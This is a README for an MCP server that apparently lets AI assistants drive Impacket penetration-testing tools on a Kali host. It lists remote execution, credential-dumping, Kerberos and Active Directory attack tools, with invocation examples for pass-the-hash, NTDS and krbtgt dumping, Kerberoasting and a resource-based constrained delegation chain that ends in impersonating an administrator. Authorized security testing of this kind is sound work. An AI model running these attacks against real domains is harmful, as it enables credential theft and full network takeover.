# Impacket MCP Server

[![MCP](https://img.shields.io/badge/MCP-Model%20Context%20Protocol-blue)](https://modelcontextprotocol.io/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue.svg)](https://www.typescriptlang.org/)
[![Impacket](https://img.shields.io/badge/Impacket-Network%20Protocols-red.svg)](https://github.com/fortra/impacket)

A Model Context Protocol (MCP) server that provides access to [Impacket](https://github.com/fortra/impacket) network protocol tools via SSH to a Kali Linux host. This enables AI assistants to perform authorized penetration testing and Active Directory security assessments.

## Overview

This MCP server wraps Impacket's comprehensive suite of network protocol tools, providing:

- **Remote Execution**: PsExec, WMIExec, SMBExec, DCOMExec, ATExec
- **Credential Attacks**: SecretsDump, AS-REP Roasting, Kerberoasting, LAPS
- **Kerberos Tools**: TGT/TGS requests, Golden/Silver ticket creation
- **Active Directory**: User/computer enumeration, delegation attacks, RBCD
- **SMB/Network**: SMB client, NTLM relay, registry operations, service management
- **Database**: MSSQL client with xp_cmdshell support

## Prerequisites

- **Node.js** 18+ with npm
- **SSH access** to a Kali Linux host with passwordless key authentication
- **Impacket** installed on the Kali host (pre-installed on Kali Linux)

## Installation

```bash
# Clone the repository
git clone https://github.com/schwarztim/sec-impacket-mcp.git
cd sec-impacket-mcp

# Install dependencies
npm install

# Build the project
npm run build
```

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `KALI_HOST` | SSH hostname for Kali Linux | `kali` |

### SSH Setup

Ensure passwordless SSH access to your Kali host:

```bash
# Generate SSH key if needed
ssh-keygen -t ed25519 -C "mcp-impacket"

# Copy to Kali host
ssh-copy-id kali

# Verify connection
ssh kali "impacket-psexec --help"
```

### Claude Desktop Integration

Add to your Claude Desktop configuration (`~/.config/claude/claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "impacket": {
      "command": "node",
      "args": ["/path/to/sec-impacket-mcp/dist/index.js"],
      "env": {
        "KALI_HOST": "kali"
      }
    }
  }
}
```

## Available Tools

### Remote Execution

| Tool | Description |
|------|-------------|
| `impacket_psexec` | PsExec-like execution via SMB/SCM - uploads service binary |
| `impacket_wmiexec` | WMI execution - stealthier, no service installation |
| `impacket_smbexec` | SMB execution with local SMB server for output |
| `impacket_dcomexec` | DCOM-based execution (MMC20, ShellWindows, ShellBrowserWindow) |
| `impacket_atexec` | Task Scheduler based execution |

### Credential Attacks

| Tool | Description |
|------|-------------|
| `impacket_secretsdump` | Dump SAM, LSA secrets, cached credentials, NTDS.dit |
| `impacket_getnpusers` | AS-REP Roasting - find users without Kerberos preauth |
| `impacket_getuserspns` | Kerberoasting - enumerate SPNs and request TGS tickets |
| `impacket_getlapspassword` | Retrieve LAPS local administrator passwords |

### Kerberos Tools

| Tool | Description |
|------|-------------|
| `impacket_gettgt` | Request Kerberos TGT for pass-the-ticket attacks |
| `impacket_getst` | Request Kerberos service tickets (TGS) |
| `impacket_ticketer` | Create Golden/Silver Kerberos tickets |

### Active Directory

| Tool | Description |
|------|-------------|
| `impacket_getadusers` | Enumerate AD users with detailed information |
| `impacket_getadcomputers` | Enumerate AD computers and their properties |
| `impacket_lookupsid` | SID bruteforce enumeration for reconnaissance |
| `impacket_finddelegation` | Find delegation relationships (unconstrained, constrained, RBCD) |
| `impacket_addcomputer` | Add computer accounts to domain |
| `impacket_rbcd` | Configure Resource-Based Constrained Delegation |

### SMB/Network

| Tool | Description |
|------|-------------|
| `impacket_smbclient` | SMB client for file operations |
| `impacket_ntlmrelayx` | NTLM relay attacks to various protocols |
| `impacket_reg` | Remote registry operations |
| `impacket_services` | Remote service management |

### Other

| Tool | Description |
|------|-------------|
| `impacket_mssqlclient` | MSSQL client with xp_cmdshell support |
| `impacket_dpapi` | Decrypt DPAPI-protected secrets |

## Authentication Methods

All tools support multiple authentication methods:

| Method | Parameter | Example |
|--------|-----------|---------|
| Password | `password` | `password: "P@ssw0rd"` |
| NTLM Hash | `hashes` | `hashes: "aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"` |
| AES Key | `aesKey` | `aesKey: "abcdef1234..."` |
| Kerberos | `kerberos` | `kerberos: true` |

## Usage Examples

### Remote Command Execution

```javascript
// PsExec with password authentication
impacket_psexec({
  target: "192.168.1.100",
  domain: "CORP",
  username: "admin",
  password: "P@ssw0rd",
  command: "whoami /all"
})

// WMIExec with NTLM hash (pass-the-hash)
impacket_wmiexec({
  target: "192.168.1.100",
  domain: "CORP",
  username: "admin",
  hashes: "aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
  command: "ipconfig /all"
})
```

### Credential Dumping

```javascript
// Dump domain controller secrets
impacket_secretsdump({
  target: "dc01.corp.local",
  domain: "CORP",
  username: "admin",
  password: "P@ssw0rd",
  just_dc_ntlm: true
})

// Dump specific user from NTDS
impacket_secretsdump({
  target: "dc01.corp.local",
  domain: "CORP",
  username: "admin",
  hashes: "aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
  just_dc_user: "krbtgt"
})
```

### Kerberos Attacks

```javascript
// Kerberoasting - request TGS for offline cracking
impacket_getuserspns({
  target: "corp.local",
  domain: "CORP",
  username: "user",
  password: "password",
  dc_ip: "192.168.1.1",
  request: true,
  format: "hashcat"
})

// AS-REP Roasting - find vulnerable accounts
impacket_getnpusers({
  target: "corp.local",
  dc_ip: "192.168.1.1",
  usersfile: "/tmp/users.txt",
  request: true,
  format: "hashcat"
})

// Request TGT for pass-the-ticket
impacket_gettgt({
  target: "CORP/admin",
  password: "P@ssw0rd",
  dc_ip: "192.168.1.1"
})
```

### Active Directory Enumeration

```javascript
// Enumerate all domain users
impacket_getadusers({
  target: "corp.local",
  domain: "CORP",
  username: "user",
  password: "password",
  dc_ip: "192.168.1.1",
  all: true
})

// Find delegation vulnerabilities
impacket_finddelegation({
  target: "corp.local",
  domain: "CORP",
  username: "user",
  password: "password",
  dc_ip: "192.168.1.1"
})

// SID enumeration for reconnaissance
impacket_lookupsid({
  target: "192.168.1.1",
  domain: "CORP",
  username: "guest",
  password: "",
  max_rid: 5000
})
```

### RBCD Attack Chain

```javascript
// 1. Add a computer account
impacket_addcomputer({
  target: "corp.local",
  domain: "CORP",
  username: "user",
  password: "password",
  dc_ip: "192.168.1.1",
  computer_name: "EVIL$",
  computer_pass: "Computer123!"
})

// 2. Configure RBCD on target
impacket_rbcd({
  target: "corp.local",
  domain: "CORP",
  username: "user",
  password: "password",
  dc_ip: "192.168.1.1",
  delegate_to: "TARGET-SERVER$",
  delegate_from: "EVIL$",
  action: "write"
})

// 3. Request service ticket with impersonation
impacket_getst({
  target: "CORP/EVIL$",
  password: "Computer123!",
  spn: "cifs/TARGET-SERVER.corp.local",
  dc_ip: "192.168.1.1",
  impersonate: "administrator"
})
```

## Security Considerations

**This tool is intended for authorized security testing only.**

- Always obtain proper authorization before testing
- Use in isolated lab environments when possible
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

## Development

```bash
# Install dependencies
npm install

# Build TypeScript
npm run build

# Watch mode for development
npm run dev
```

## Related Projects

- [Impacket](https://github.com/fortra/impacket) - The underlying network protocol library
- [Model Context Protocol](https://modelcontextprotocol.io/) - MCP specification
- [Kali Linux](https://www.kali.org/) - Penetration testing distribution

## License

MIT License - see [LICENSE](LICENSE) for details.

## Disclaimer

This software is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse or damage caused by this software. Always ensure you have proper authorization before conducting any security assessments.
